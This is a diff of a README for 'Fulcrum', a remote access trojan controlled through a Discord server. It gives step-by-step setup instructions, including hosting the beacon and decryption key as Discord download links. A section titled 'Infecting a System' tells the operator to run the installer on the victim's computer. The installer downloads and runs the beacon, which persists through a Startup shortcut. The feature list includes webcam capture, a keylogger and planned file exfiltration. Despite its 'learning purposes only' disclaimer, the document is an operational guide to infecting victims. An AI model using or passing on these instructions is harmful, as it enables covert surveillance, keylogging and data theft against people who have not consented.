@@ -1,32 +1,39 @@
 # Fulcrum
-**THIS CODE IS FOR LEARNING PURPOSES ONLY. THIS CODE IS NOT FOR USE WITHOUT PERMISSION. THE CURRENT VERSION IS NOT ANONYMIZED AND CAN BE TRACED BACK TO YOU. DO NOT MISUSE THIS!**
+**THIS CODE IS FOR LEARNING PURPOSES ONLY. THIS CODE IS NOT FOR USE WITHOUT PERMISSION. DO NOT MISUSE THIS!**
 
 Fulcrum is a remote monitoring and access software with a Fulcrum beacon running on an infected computer that is accessible via a dedicated Discord server. The Discord server acts as a command and control server for an unlimited number of beacons. Each beacon creates its own text channel with the PC's name and a hardware ID as the channel's name. **Check out the supported commands below ↓**
 
 
 ### Setup
-- If you want the installer to work without a `.env` file, you will need to modify the code and add the token directly. Add the token at the start of both the `fulcrum_beacon.pyw` file and the `installer.py` file.
 - Create your own Discord bot at [Discord Developer Portal](https://discord.com/developers/applications).
 - Set up a Discord server with the following structure
 
 ![image](https://github.com/user-attachments/assets/c5ecaac9-9e8d-4ba2-b3e6-b98066d3c38b)
 
-- Invite your bot to the server
-- Send your `fulcrum_beacon.pyw` file (can be renamed) into the `fulcrum-beacon` channel
-    - if you want to use a compiled version of `fulcrum_beacon.pyw` you will need Discord nitro to upload the file due to its size.
+- Invite your bot to the server.
+- Run the ``token_and_key_gen.py`` and input your discord bot token.
+    - There should be two new files in the directory called ``.env`` and ``key.key``.
+    - Upload both files to the ``your-files`` channel.
+- Copy the download link of the ``key.key`` file and add it to the code of the ``fulcrum_beacon.pyw`` file at `DECRYPTION_KEY_URL = "YOUR URL"`
+- Upload the ``fulcrum_beacon.pyw`` file to the ``your-files`` channel.
+  - You can rename ``fulcrum_beacon.pyw`` if you want to.
+  - If you want to use a compiled version of ``fulcrum_beacon.pyw`` you will need Discord nitro to upload the file due to its size.
+- Copy the download link of the ``.env`` file and add it to the code of the ``installer.py`` file at ``DOT_ENV_FILE_URL = "YOUR URL"``
+- Copy the download link of the ``fulcrum_beacon.pyw``(or your renamed file) file and add it to the code of the ``installer.py`` file at ``BEACON_URL = "YOUR URL"`` 
+image here    
 
   
 ### Infecting a System
-- Execute the `installer.py` file on the victim's computer.
-  - If you did not modify the code, you will need a `.env` file with your bot token:
-      - `TOKEN = 'YOUR TOKEN'`
-- When the victim's computer is rebooted, the Fulcrum beacon will execute, and the victim will appear on Discord.
-
+- Execute the ``installer.py`` file on the victim's computer.
+  - remember to add your Url to ``installer.py`` before.
+- The Fulcrum beacon will be downloaded and execute.
+- A new discord channel will appear on your discord server.
+  - ``[pc name]-[hardware id]``
+- The beacon adds a .lnk file to the Startup folder and will reconnect after the system is turn off and on again.
 ![image](https://github.com/user-attachments/assets/00af552b-57f7-4d3a-b14a-4fe0e6783ba9)  
 ![image](https://github.com/user-attachments/assets/f5adfc95-d592-4368-8305-7a9a06009580)
 
-- You can now use any command through the created channel or the `all-channel` channel. 
-
+- You can now use any command through the created channel or the `all-channel` channel.
 
 ### Current Commands
 - **-TP [x]**: Takes a picture via a connected device. You can pass the identifier number to the command. If not, it will use 0.
@@ -46,16 +53,9 @@ Fulcrum is a remote monitoring and access software with a Fulcrum beacon running
 
 ### Soon
 - **Triggers** that will activate the keylogger when certain events happen on the computer.
-- **Obfuscation and encryption of the discord token.**
-- **File Downloader** A download command that sends a file from the system into the iscord channel -GF [path]
+- **File Downloader** A download command that sends a file from the system into the discord channel -GF [path]
 - **Internet History Log**
 - **Clipboard monitoring**
-
-  
-### In work
-- **Obfuscation and encryption of the discord token.**
-  - progress inside `token-obfuscation-and-encryption` branch
-  - this will also eliminate the need for a .env file
 
 
 ### Known bugs
